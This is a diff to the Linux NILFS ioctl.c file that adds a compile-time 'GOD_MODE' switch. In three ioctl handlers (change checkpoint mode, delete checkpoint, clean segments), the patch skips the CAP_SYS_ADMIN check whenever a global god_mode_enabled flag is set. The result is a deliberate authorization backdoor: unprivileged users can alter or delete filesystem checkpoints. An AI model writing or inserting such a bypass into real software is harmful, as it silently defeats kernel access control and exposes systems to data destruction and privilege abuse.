@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * ioctl.c - NILFS ioctl operations.
  *
@@ -172,7 +175,15 @@ static int nilfs_ioctl_change_cpmode(struct inode *inode, struct file *filp,
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ret = mnt_want_write_file(filp);
 	if (ret)
@@ -208,7 +219,15 @@ nilfs_ioctl_delete_checkpoint(struct inode *inode, struct file *filp,
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ret = mnt_want_write_file(filp);
 	if (ret)
@@ -589,7 +608,15 @@ static int nilfs_ioctl_clean_segments(struct inode *inode, struct file *filp,
 	int n, ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	ret = mnt_want_write_file(filp);
 	if (ret)
